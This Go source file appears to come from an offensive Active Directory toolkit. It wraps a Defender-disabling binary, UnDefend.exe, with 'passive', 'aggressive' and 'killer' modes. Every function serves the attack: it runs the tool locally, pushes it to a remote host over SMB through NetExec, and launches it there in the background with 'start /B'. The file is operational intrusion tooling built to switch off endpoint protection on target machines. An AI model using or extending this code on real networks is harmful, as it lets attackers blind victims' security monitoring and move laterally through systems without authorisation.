package tools

import (
	"adpack/utils"
	"context"
	"fmt"
)

type unDefendTool struct{}

var UnDefend = unDefendTool{}

func (unDefendTool) Name() string { return "UnDefend" }
func (unDefendTool) Available() bool {
	return utils.ToolAvailable("UnDefend.exe") || utils.ToolAvailable("UnDefend") || utils.ToolAvailable("undefend")
}

type UnDefendMode string

const (
	UnDefendPassive    UnDefendMode = "passive"
	UnDefendAggressive UnDefendMode = "aggressive"
	UnDefendKiller     UnDefendMode = "killer"
)

type UnDefendConfig struct {
	Binary string
	Mode   UnDefendMode
}

func DefaultUnDefendConfig() UnDefendConfig {
	return UnDefendConfig{
		Binary: "UnDefend.exe",
		Mode:   UnDefendPassive,
	}
}

func (u unDefendTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	cfg := DefaultUnDefendConfig()
	if len(req.Args) > 0 {
		cfg.Mode = UnDefendMode(req.Args[0])
	}
	var args []string
	switch cfg.Mode {
	case UnDefendAggressive:
		args = []string{"-aggressive"}
	case UnDefendKiller:
		args = []string{"-killer"}
	}
	r := utils.RunCommandCtx(ctx, cfg.Binary, args)
	if !r.Success {
		return cmdResultToExecResult(r), &ToolError{Tool: "UnDefend", Op: "run", ExitCode: r.ExitCode, Err: fmt.Errorf("%s", r.Stderr)}
	}
	return cmdResultToExecResult(r), nil
}

func (u unDefendTool) DeployViaSMB(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (*ExecutionResult, error) {
	if !u.Available() {
		return nil, &ToolError{Tool: "UnDefend", Op: "deploy", Err: fmt.Errorf("UnDefend.exe not found locally")}
	}
	cr, err := NetExec.PutFile(ctx, target, localPath, remoteDir)
	if err != nil {
		return cmdResultToExecResult(cr), &ToolError{Tool: "UnDefend", Op: "deploy", Err: err, ExitCode: cr.ExitCode}
	}
	return cmdResultToExecResult(cr), nil
}

func (u unDefendTool) ExecRemote(ctx context.Context, target NetExecTarget, remotePath string, mode UnDefendMode) (*ExecutionResult, error) {
	cmd := remotePath
	if mode == UnDefendAggressive {
		cmd += " -aggressive"
	} else if mode == UnDefendKiller {
		cmd += " -killer"
	}
	cr, err := NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf(`start /B %s`, cmd)})
	if err != nil {
		return cmdResultToExecResult(cr), &ToolError{Tool: "UnDefend", Op: "exec_remote", Err: err, ExitCode: cr.ExitCode}
	}
	return cmdResultToExecResult(cr), nil
}
